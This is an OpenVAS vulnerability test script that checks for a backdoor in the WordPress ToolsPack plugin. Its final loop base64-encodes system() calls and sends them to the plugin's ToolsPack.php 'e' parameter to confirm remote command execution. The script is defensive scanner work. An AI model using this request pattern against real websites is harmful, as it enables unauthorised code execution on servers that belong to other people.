###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_toolspack_backdoor_2012.nasl 11855 2018-10-12 07:34:51Z cfischer $
#
# Backdoored WordPress ToolsPack Plugin
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_xref(name:"URL", value:"http://www.wordpress.org");
  script_xref(name:"URL", value:"http://blog.sucuri.net/2012/02/new-wordpress-toolspack-plugin.html");
  script_oid("1.3.6.1.4.1.25623.1.0.103445");
  script_version("$Revision: 11855 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Backdoored WordPress ToolsPack Plugin");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 09:34:51 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-03-08 10:26:15 +0100 (Thu, 08 Mar 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"The WordPress ToolsPack Plugin on this host contains a Backdoor.");
  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code within the
context of the affected webserver process.");
  script_tag(name:"solution", value:"Remove the plugin and do a full review of the website - check all your files,
update WordPress, change passwords, etc.");

  script_tag(name:"solution_type", value:"Workaround");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

commands = exploit_commands();

foreach cmd (keys(commands)) {

  ex = "system('" + commands[cmd]  + "');";
  ex = base64(str:ex);
  url = string(dir, "/wp-content/plugins/ToolsPack/ToolsPack.php?e=",ex);

  if(buf = http_vuln_check(port:port, url:url,pattern:cmd)) {
    desc = 'It was possible to execute the command "' + commands[cmd]  + '" which produces the following output:\n\n' + buf + '\n';
    security_message(port:port,data:desc);
    exit(0);
  }
}

exit(0);
